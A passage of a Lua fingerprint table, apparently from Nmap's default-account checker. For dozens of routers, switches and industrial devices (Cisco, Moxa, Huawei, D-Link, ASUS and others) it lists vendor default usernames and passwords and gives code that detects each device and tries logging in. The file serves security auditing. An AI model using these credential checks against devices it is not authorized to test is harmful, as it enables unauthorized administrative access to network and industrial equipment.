    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/nikola_login.html", 1, true)
           and response.body:lower():find("<title>switch</title>", 1, true)
  end,
  login_combos = {
    {username = "cisco", password = "cisco"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {uname=user,
                  pwd2=base64.enc(pass),
                  language_selector="en-US",
                  err_flag=0,
                  err_msg="",
                  passpage="nikola_main2.html",
                  failpage="nikola_login.html",
                  submit_flag=0}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "nikola_login.html"),
                                 nil, form)
    return resp.status == 200 and get_cookie(resp, "SID", ".")
  end
})

table.insert(fingerprints, {
  name = "Cisco Linksys",
  cpe = "cpe:/h:linksys:*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response) or ""
    return realm:find("^Linksys %u[%u%d]+%s*$")
           or realm:find("^WRT54GC%w*$")
           or realm == "NR041"
  end,
  login_combos = {
    {username = "", password = "admin"},
    {username = "admin", password = "admin"},
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Cisco DPC3848VM",
  cpe = "cpe:/h:cisco:dpc3848vm",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and response.header["location"] == "Docsis_system.php"
  end,
  login_combos = {
    {username = "user", password = ""},
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {username_login=user,
                  password_login=pass,
                  LanguageSelect="en",
                  login="Log In"}
    local resp = http_post_simple(host, port, url.absolute(path, "check.php"),
                                 nil, form)
    if not (resp.status == 200 and resp.body) then return false end
    local lstatus = resp.body:match("%Wvar%s+login_status%s*=%s*(%-?%d+)")
    return tonumber(lstatus or "99") <= 0
  end
})

table.insert(fingerprints, {
  name = "Cisco EPC3925",
  cpe = "cpe:/h:cisco:epc3925",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Docsis", 1, true)
           and response.body:find("%Wwindow%.location%.href%s*=%s*(['\"])Docsis_system%.asp%1")
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {username_login=user,
                  password_login=pass,
                  LanguageSelect="en",
                  Language_Submit="0",
                  login="Log In"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "goform/Docsis_system"),
                                 nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/Quick_setup%.asp$")
  end
})

table.insert(fingerprints, {
  name = "Cisco Configuration Utility (var.1)",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("cisco", 1, true)
           and response.body:find("%Wfunction%s+en_value%s*%(")
           and get_tag(response.body, "input", {name="^keep_name$"})
  end,
  login_combos = {
    {username = "cisco", password = "cisco"}
  },
  login_check = function (host, port, path, user, pass)
    pass = ("%s%02d"):format(pass, #pass)
    pass = pass:rep(math.ceil(64 / #pass)):sub(1, 64)
    local form = {submit_button="login",
                  keep_name=0,
                  enc=1,
                  user=user,
                  pwd=stdnse.tohex(openssl.md5(pass))}
    local resp = http_post_simple(host, port, url.absolute(path, "login.cgi"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):find("%Wvar%s+session_key%s*=%s*(['\"])%x*%1%s*;")
  end
})

table.insert(fingerprints, {
  name = "Cisco Configuration Utility (var.2)",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("cisco", 1, true)
           and response.body:find("%Wfunction%s+en_value%s*%(")
           and get_tag(response.body, "input", {name="^gui_action$"})
  end,
  login_combos = {
    {username = "cisco", password = "cisco"}
  },
  login_check = function (host, port, path, user, pass)
    pass = ("%s%02d"):format(pass, #pass)
    pass = pass:rep(math.ceil(64 / #pass)):sub(1, 64)
    local form = {submit_button="login",
                  submit_type="",
                  gui_action="",
                  wait_time=0,
                  change_action="",
                  enc=1,
                  user=user,
                  pwd=stdnse.tohex(openssl.md5(pass)),
                  sel_lang="EN"}
    local resp = http_post_simple(host, port, url.absolute(path, "login.cgi"),
                                 nil, form)
    return resp.status == 200
           and get_tag(resp.body or "", "input", {name="^session_key$", value="^%x+$"})
  end
})

table.insert(fingerprints, {
  name = "Cisco Router Access",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("%Wvar%s+nonce%s*=%s*(['\"])%x+%1")
           and response.body:find("%Wfunction%s+en_value%s*%(")
           and get_tag(response.body, "input", {name="^gui_action$"})
  end,
  login_combos = {
    {username = "", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local nonce = resp1.body:match("%Wvar%s+nonce%s*=%s*['\"](%x+)['\"]")
    if not nonce then return false end
    pass = ("%s%02d"):format(pass, #pass)
    pass = pass:rep(math.ceil(64 / #pass)):sub(1, 64)
    pass = stdnse.tohex(openssl.md5(pass))
    local wait_time = get_tag(resp1.body, "input", {name="^wait_time$"})
    local form = {submit_button="login",
                  change_action="",
                  gui_action="Apply",
                  wait_time=wait_time and wait_time.value or "",
                  submit_type="",
                  http_username=user,
                  http_passwd=stdnse.tohex(openssl.md5(pass .. nonce))}
    local resp2 = http_post_simple(host, port, url.absolute(path, "login.cgi"),
                                  nil, form)
    return resp2.status == 200
           and (resp2.body or ""):find(";session_id=%x+%W")
  end
})

table.insert(fingerprints, {
  name = "Cisco IronPort",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 303
           and (response.header["server"] or ""):find("^glass/%d+%.")
           and (response.header["location"] or ""):find("/login%f[?\0]")
           and get_cookie(response, "sid", "^%w+$")
  end,
  login_combos = {
    {username = "admin", password = "ironport"}
  },
  login_check = function (host, port, path, user, pass)
    local refpath = url.absolute(path, "default")
    local form = {referrer=url.build(url_build_defaults(host, port, {path=refpath})),
                  screen="login",
                  username=user,
                  password=pass,
                  action="Login"}
    local resp = http_post_simple(host, port, url.absolute(path, "login"),
                                 nil, form)
    return resp.status == 303
           and (get_cookie(resp, "euq_authenticated", "^%w+$")
             or get_cookie(resp, "authenticated", "^%w+$"))
  end
})

table.insert(fingerprints, {
  name = "Allied Telesis AR",
  cpe = "cpe:/h:alliedtelesyn:cable_dsl_router_at-ar*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response) or ""
    return realm:find("^Allied Telesis ")
           or realm:find("^Allied Telesyn ")
           or realm:find("^CentreCOM ")
  end,
  login_combos = {
    {username = "manager", password = "friend"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "HP ProCurve Switch",
  cpe = "cpe:/h:hp:procurve_switch",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):lower():find("^ehttp[/%s]")
           and response.body
           and response.body:find("ProCurve Switch", 1, true)
           and (response.body:find("%Wdocument%.location%s*=%s*(['\"])home%.html%1")
             or get_tag(response.body, "frame", {src="^nctabs%.html$"}))
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "security/web_access.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Huawei USG",
  cpe = "cpe:/h:huawei:usg*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and get_cookie(response, "SESSIONID", "&Huawei")
  end,
  login_combos = {
    {username = "admin",       password = "Admin@123"},
    {username = "audit-admin", password = "Admin@123"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    local cookie
    for _, ck in ipairs(resp1.cookies or {}) do
      if ck.name == "SESSIONID" then
        cookie = "SESSIONID=" .. ck.value
        if not ck.httponly then
          cookie = cookie:match("^(.-)&")
        end
        break
      end
    end
    if not (resp1.status == 200 and cookie) then return false end
    local form = {["spring-security-redirect"]="",
                  password=pass,
                  language="en",
                  lang="English",
                  username=user,
                  platcontent=""}
    local lurl = url.absolute(path, "default.html?dc=" .. math.floor(stdnse.clock_ms()))
    local resp2 = http_post_simple(host, port, lurl, {cookies=cookie}, form)
    return resp2.status == 200
           and (resp2.body or ""):find("top.location.replace(localHref)", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Moxa AirWorks",
  category = "routers",
  paths = {
    {path = "/Login.asp"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("Moxa AWK", 1, true)
           and response.body:find("/webNonce%W")
           and get_tag(response.body, "form", {action="/home%.asp$"})
  end,
  login_combos = {
    {username = "admin", password = "root"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, url.absolute(path, "Login.asp"))
    if not (resp1.status == 200 and resp1.body) then return false end
    local pcookie = resp1.body:match("%Wfunction%s+SetCookie%W[^}]-theName%s*=%s*['\"](.-)[='\"]")
    if not pcookie then return false end
    local form2 = {user=user, time=math.floor(stdnse.clock_ms())}
    local url2 = url.absolute(path, "webNonce?" .. url.build_query(form2))
    local resp2 = http_get_simple(host, port, url2,
                                 {cookies={{name=pcookie, value=""}}})
    if not (resp2.status == 200 and resp2.body) then return false end
    local cpass = stdnse.tohex(openssl.md5(pass .. resp2.body))
    local form3 = {Username=user,
                   Password="",
                   ["Submit.x"]=0,
                   ["Submit.y"]=0}
    local resp3 = http_post_simple(host, port, url.absolute(path, "home.asp"),
                                  {cookies={{name=pcookie, value=cpass}}},
                                  form3)
    return resp3.status == 200
           and get_tag(resp3.body or "", "frame", {src="^main%.asp$"})
  end
})

table.insert(fingerprints, {
  name = "Moxa EDR (var.1)",
  cpe = "cpe:/o:moxa:edr_g903_firmware",
  category = "routers",
  paths = {
    {path = "/Login.asp"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("Moxa EDR", 1, true)
           and response.body:find(">iGenSel2%((['\"])Username%1")
           and response.body:find("%Wdocument%.getElementById%(%s*(['\"])Username%1%s*%)%.value%s*%+%s*(['\"]):%2")
  end,
  login_combos = {
    {username = "admin", password = ""},
    {username = "user",  password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local cpass = stdnse.tohex(openssl.md5(#pass > 0 and pass or "NULL"))
    local cookies = {{name="admin:EDR", value=(user=="admin" and cpass or "")},
                     {name="user:EDR", value=(user=="user" and cpass or "")}}
    local form1 = {Username=user,
                   Password=pass,
                   ["Submit.x"]=0,
                   ["Submit.y"]=0}
    local resp1 = http_post_simple(host, port, url.absolute(path, "init.asp"),
                                  {cookies=cookies}, form1)
    if resp1.status~=200 then return false end
    local resp2 = http_get_simple(host, port, url.absolute(path, "index.asp"),
                                 {cookies=cookies})
    return resp2.status == 200
           and get_tag(resp2.body or "", "frame", {src="^name%.asp$"})
end
})

table.insert(fingerprints, {
  name = "Moxa EDR (var.2)",
  cpe = "cpe:/o:moxa:edr_g903_firmware",
  category = "routers",
  paths = {
    {path = "/Login.asp"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("Moxa EDR", 1, true)
           and response.body:find(">iGenSel2%((['\"])Username%1")
           and response.body:find("%Wdocument%.getElementById%(%s*(['\"])Username%1%s*%)%.value%s*;")
  end,
  login_combos = {
    {username = "admin", password = ""},
    {username = "user",  password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local cuser = #user > 0 and user or "unknown"
    local cpass = #pass > 0 and pass or "NULL"
    local cookies = {{name="NAME", value=url.escape(cuser)},
                     {name="PASSWORD", value=stdnse.tohex(openssl.md5(cpass))}}
    local form1 = {Username=user,
                   Password=pass,
                   ["Submit.x"]=0,
                   ["Submit.y"]=0}
    local resp1 = http_post_simple(host, port, url.absolute(path, "init.asp"),
                                  {cookies=cookies}, form1)
    if resp1.status~=200 then return false end
    local resp2 = http_get_simple(host, port, url.absolute(path, "home.asp"),
                                 {cookies=cookies})
    return resp2.status == 200
           and get_tag(resp2.body or "", "frame", {src="^name%.asp$"})
end
})

table.insert(fingerprints, {
  name = "Moxa EDR (var.3)",
  cpe = "cpe:/o:moxa:edr_g903_firmware",
  category = "routers",
  paths = {
    {path = "/Login.asp"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("Moxa EDR", 1, true)
           and response.body:find("%Wdocument%.getElementById%(%s*(['\"])InputPassword%1%s*%)%.action%s*=%s*(['\"])[^'\"]-/init%.asp%2")
           and not response.body:find("sysnotify_support", 1, true)
           and response.body:find("%Wvar%s+rndN%s*=%s*%d+%s*;")
  end,
  login_combos = {
    {username = "admin", password = "moxa"},
    {username = "user",  password = "moxa"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, url.absolute(path, "Login.asp"))
    if not (resp1.status == 200 and resp1.body) then return false end
    local nonce = resp1.body:match("%Wvar%s+rndN%s*=%s*(%d+)%s*;")
    if not nonce then return false end
    local cuser = #user > 0 and user or "unknown"
    local cpass = pass .. nonce
    local cookies = {{name="NAME", value=url.escape(cuser)},
                     {name="PASSWORD", value=stdnse.tohex(openssl.md5(cpass))}}
    local form2 = {Username=user,
                   Password=pass,
                   ["Submit.x"]=0,
                   ["Submit.y"]=0}
    local resp2 = http_post_simple(host, port, url.absolute(path, "init.asp"),
                                  {cookies=cookies}, form2)
    if resp2.status~=200 then return false end
    local resp3 = http_get_simple(host, port, url.absolute(path, "home.asp"),
                                 {cookies=cookies})
    return resp3.status == 200
           and get_tag(resp3.body or "", "frame", {src="^name%.asp$"})
  end
})

table.insert(fingerprints, {
  name = "Moxa EDR (var.4)",
  category = "routers",
  paths = {
    {path = "/Login.asp"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("Moxa EDR", 1, true)
           and response.body:find("%Wdocument%.getElementById%(%s*(['\"])InputPassword%1%s*%)%.action%s*=%s*(['\"])[^'\"]-/init%.asp%2")
           and not response.body:find("sysnotify_support", 1, true)
           and not response.body:find("%Wvar%s+rndN%s*=%s*%d+%s*;")
  end,
  login_combos = {
    {username = "admin", password = "moxa"},
    {username = "user",  password = "moxa"}
  },
  login_check = function (host, port, path, user, pass)
    local cuser = #user > 0 and user or "unknown"
    local cpass = #pass > 0 and pass or "NULL"
    local cookies = {{name="NAME", value=url.escape(cuser)},
                     {name="PASSWORD", value=stdnse.tohex(openssl.md5(cpass))}}
    local form1 = {Username=user,
                   Password=pass,
                   ["Submit.x"]=0,
                   ["Submit.y"]=0}
    local resp1 = http_post_simple(host, port, url.absolute(path, "init.asp"),
                                  {cookies=cookies}, form1)
    if resp1.status~=200 then return false end
    local resp2 = http_get_simple(host, port, url.absolute(path, "home.asp"),
                                 {cookies=cookies})
    return resp2.status == 200
           and get_tag(resp2.body or "", "frame", {src="^name%.asp$"})
  end
})

table.insert(fingerprints, {
  name = "Moxa EDR (var.5)",
  cpe = "cpe:/o:moxa:edr_g903_firmware",
  category = "routers",
  paths = {
    {path = "/Login.asp"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("Moxa EDR", 1, true)
           and response.body:find("%Wdocument%.getElementById%(%s*(['\"])InputPassword%1%s*%)%.action%s*=%s*(['\"])[^'\"]-/init%.asp%2")
           and response.body:find("sysnotify_support", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "moxa"},
    {username = "user",  password = "moxa"}
  },
  login_check = function (host, port, path, user, pass)
    local cuser = #user > 0 and user or "unknown"
    local cpass = #pass > 0 and pass or "NULL"
    local cookies = {{name="sysnotify_support", value="yes"},
                     {name="sysnotify_loginStatus", value="initial"},
                     {name="lasttime", value=tostring(math.floor(stdnse.clock_ms()))},
                     {name="sessionID", value=tostring(math.random(1000000000, 4294967295))},
                     {name="NAME", value=url.escape(cuser)},
                     {name="PASSWORD", value=stdnse.tohex(openssl.md5(cpass))},
                     {name="AUTHORITY", value=""}}
    local form = {Username=user,
                  Password=pass,
                  ["Submit.x"]=0,
                  ["Submit.y"]=0}
    local resp = http_post_simple(host, port, url.absolute(path, "init.asp"),
                                 {cookies=cookies}, form)
    return resp.status == 200
           and (resp.body or ""):find("%sonLoad%s*=%s*['\"]SetAuthorityCookie%(")
  end
})

table.insert(fingerprints, {
  name = "Ovislink AirLive (basic auth)",
  cpe = "cpe:/h:ovislink:airlive_*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response) or ""
    return realm:find("^AirLive ")
           or realm:find("%f[%w]admin/airlive$")
           or realm:find("%f[%w]airlive/airlive$")
  end,
  login_combos = {
    {username = "admin", password = "airlive"},
    {username = "airlive", password = "airlive"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Ovislink AirLive AP",
  cpe = "cpe:/h:ovislink:airlive_*",
  category = "routers",
  paths = {
    {path = "/index.asp"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("AirLive", 1, true)
           and response.body:lower():find("<title>airlive [%w-]+</title>")
           and response.body:lower():find("%shref%s*=%s*(['\"]?)sts_%w+%.asp%1[%s>]")
  end,
  login_combos = {
    {username = "", password = "airlive"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "goform/asp_login"),
                                 nil, {psw=pass})
    return resp.status == 302
           and (resp.header["location"] or ""):find("/sts_%w+%.asp$")
  end
})

table.insert(fingerprints, {
  name = "Ovislink AirLive WIAS (var.1)",
  cpe = "cpe:/h:ovislink:airlive_*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("WIAS", 1, true)
           and response.body:lower():find("<title>wias%-%d+%a</title>")
           and get_tag(response.body, "form", {action="^check%.shtml$"})
           and get_tag(response.body, "input", {name="^password$"})
  end,
  login_combos = {
    {username = "admin", password = "airlive"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "check.shtml"),
                                 nil, {username=user,password=pass})
    return resp.status == 302
           and resp.header["location"] == "home.shtml"
  end
})

table.insert(fingerprints, {
  name = "Ovislink AirLive WIAS (var.2)",
  cpe = "cpe:/h:ovislink:airlive_*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("AirLive", 1, true)
           and response.body:lower():find("<title>airlive wias%-%d+%a</title>")
           and get_tag(response.body, "form", {action="^check%.shtml$"})
           and get_tag(response.body, "input", {name="^adm_pwd$"})
  end,
  login_combos = {
    {username = "admin", password = "airlive"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "check.shtml"),
                                 nil, {adm_name=user,adm_pwd=pass})
    return resp.status == 302
           and resp.header["location"] == "home.shtml"
  end
})

table.insert(fingerprints, {
  name = "AirTies router",
  cpe = "cpe:/h:airties:air_*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and get_refresh_url(response.body, "/js/%.js_check%.html$")
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {redirect="",
                  self="",
                  user=user,
                  password=pass,
                  gonder="OK"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "cgi-bin/login"),
                                 nil, form)
    return resp.status == 200
           and get_cookie(resp, "AIRTIESSESSION", "^%x+$")
           and get_refresh_url(resp.body or "", "/main%.html$")
  end
})

table.insert(fingerprints, {
  name = "Arris Touchstone",
  cpe = "cpe:/a:arris:touchstone_*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("sta_wifi", 1, true)
           and get_tag(response.body, "form", {action="^check%.php$"})
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "check.php"),
                                 nil, {username=user,password=pass})
    return resp.status == 200
           and get_cookie(resp, "PHPSESSID", "^%w+$")
           and (resp.body or ""):find("%Wlocation%.href%s*=%s*(['\"])admin_password_change%.php%1")
  end
})

table.insert(fingerprints, {
  name = "ASUS TM router",
  cpe = "cpe:/h:asus:tm-*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^TM%-%u[%u%d]+$")
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "ASUS router",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response)
    if not realm then return false end
    local type = realm:match("^(%u+)%-%u[%u%d]+$")
    for t in ("DSL,EA,RP,RT,TM"):gmatch("%u+") do
      if t == type then return true end
    end
    return false
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "ASUS RX3041",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^ *RX3041%f[ \0]")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Belkin G Wireless Router",
  cpe = "cpe:/h:belkin:f5d7234-4",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("setup_top.htm", 1, true)
           and response.body:find("status.stm", 1, true)
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "cgi-bin/login.exe"), nil,
                                 {totalMSec = stdnse.clock_ms()/1000,
                                 pws = stdnse.tohex(openssl.md5(pass))})
    return resp.status == 302
           and (resp.header["location"] or ""):find("/index%.htm$")
  end
})

table.insert(fingerprints, {
  name = "Belkin/Arris 2307",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("isAPmode", 1, true)
           and get_tag(response.body, "meta", {name="^description$", content="^%w+ 2307$"})
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {page="",
                  logout="",
                  action="submit",
                  pws=base64.enc(pass),
                  itsbutton1="Submit",
                  h_language="en",
                  is_parent_window="1"}
    local resp = http_post_simple(host, port, url.absolute(path, "login.cgi"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):find("index.html", 1, true)
  end
})

table.insert(fingerprints, {
  name = "D-Link DIR router (var.1)",
  cpe = "cpe:/h:d-link:dir-*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find(" DIR%-%d+")
           and response.body
           and response.body:find("AUTH.Login(", 1, true)
           and response.body:find('%WOBJ%("loginusr"%)%.value%s*=%s*""')
           and response.body:lower():find("<title>d%-link systems[^<]+ home</title>")
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {REPORT_METHOD="xml",
                  ACTION="login_plaintext",
                  USER=user,
                  PASSWD=pass,
                  CAPTCHA=""}
    local resp = http_post_simple(host, port, url.absolute(path, "session.cgi"),
                                 {cookies="uid="..random_alnum(10)}, form)
    return resp.status == 200
           and (resp.body or ""):find("<RESULT>SUCCESS</RESULT>", 1, true)
  end
})

table.insert(fingerprints, {
  name = "D-Link DIR router (var.2)",
  cpe = "cpe:/h:d-link:dir-*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find(" DIR%-%d+")
           and response.body
           and response.body:find("AUTH.Login(", 1, true)
           and response.body:find('%WOBJ%("loginusr"%)%.value%s*=%s*username%W')
           and response.body:lower():find("<title>d%-link systems[^<]+ home</title>")
  end,
  login_combos = {
    {username = "Admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {REPORT_METHOD="xml",
                  ACTION="login_plaintext",
                  USER=user,
                  PASSWD=pass,
                  CAPTCHA=""}
    local resp = http_post_simple(host, port, url.absolute(path, "session.cgi"),
                                 {cookies="uid="..random_alnum(10)}, form)
    return resp.status == 200
           and (resp.body or ""):find("<RESULT>SUCCESS</RESULT>", 1, true)
  end
})

table.insert(fingerprints, {
  name = "D-Link DIR router (var.3)",
  cpe = "cpe:/h:d-link:dir-*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and (response.header["server"] or ""):find(" DIR%-%d+")
           and response.body
           and response.body:find("AUTH.Login_Hash(", 1, true)
           and response.body:lower():find("<title>d%-link systems[^<]+ home</title>")
  end,
  login_combos = {
    {username = "Admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local url2 = url.absolute(path, "authentication.cgi")
    local url1 = url2 .. "?captcha=&dummy=" .. math.floor(stdnse.clock_ms())
    local resp1 = http_get_simple(host, port, url1)
    if not (resp1.status == 200 and resp1.body) then return false end
    local jstatus, jout = json.parse(resp1.body)
    if not (jstatus and jout.uid and jout.challenge) then return false end
    local auth = stdnse.tohex(openssl.hmac("MD5", pass, user .. jout.challenge))
    local resp2 = http_post_simple(host, port, url2,
                                  {cookies = "uid=" .. jout.uid},
                                  {id=user, password=auth:upper()})
    if not (resp2.status == 200 and resp2.body) then return false end
    jstatus, jout = json.parse(resp2.body)
    return jstatus and jout.status == "ok"
  end
})

table.insert(fingerprints, {
  name = "D-Link DIR-620",
  cpe = "cpe:/h:d-link:dir-620",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("DIR-620", 1, true)
           and response.body:lower():find("<title>dir-620</title>", 1, true)
           and get_tag(response.body, "form", {action="^index%.cgi$"})
  end,
  login_combos = {
    {username = "admin", password = "anonymous"}
  },
  login_check = function (host, port, path, user, pass)
    local cookies = {{name="user_ip", value="127.0.0.1"},
                     {name="cookie_lang", value="rus"},
                     {name="client_login", value=user},
                     {name="client_password", value=pass}}
    local resp = http_post_simple(host, port, url.absolute(path, "index.cgi"),
                                 {cookies=cookies},
                                 {v2="y",rs_type="html",auth="auth"})
    return resp.status == 200
           and (resp.body or ""):find("%sid%s*=%s*(['\"])v_firmware_value%1%s*>%d")
  end
})

table.insert(fingerprints, {
  name = "D-Link DIR router (basic auth)",
  cpe = "cpe:/h:d-link:dir-*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("%f[%w]DIR%-%d%d%d%f[%u\0]")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "D-Link DSL router",
  cpe = "cpe:/h:d-link:dsl-*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^mini_httpd/%d+%.")
           and response.body
           and response.body:find("%Wwindow%.location%.href%s*=%s*(['\"])[^'\"]-/cgi%-bin/webproc%1")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "admin", password = "password"},
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "cgi-bin/webproc")
    local resp1 = http_get_simple(host, port, lurl)
    if not (resp1.status == 200) then return false end
    local form = {getpage="html/index.html",
                  errorpage="html/main.html",
                  ["var:menu"]="setup",
                  ["var:page"]="wizard",
                  ["obj-action"]="auth",
                  [":username"]=user,
                  [":password"]=pass,
                  [":action"]="login",
                  [":sessionid"]=get_cookie(resp1, "sessionid")}
    local resp2 = http_post_simple(host, port, lurl,
                                  {cookies=resp1.cookies}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("/cgi-bin/webproc?getpage=html/index.html&", 1, true)
  end
})

table.insert(fingerprints, {
  name = "D-Link DSL router (basic auth)",
  cpe = "cpe:/h:d-link:dsl-*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^DSL%-%d%d%d%d?[BRU]%f[_\0]")
  end,
  login_combos = {
    {username = "admin",   password = "admin"},
    {username = "support", password = "support"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "D-Link DSL T router (basic auth)",
  cpe = "cpe:/h:d-link:dsl-*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("%f[^ \0]DSL%-%d%d%d%d?T$")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "user",  password = "user"}
  },
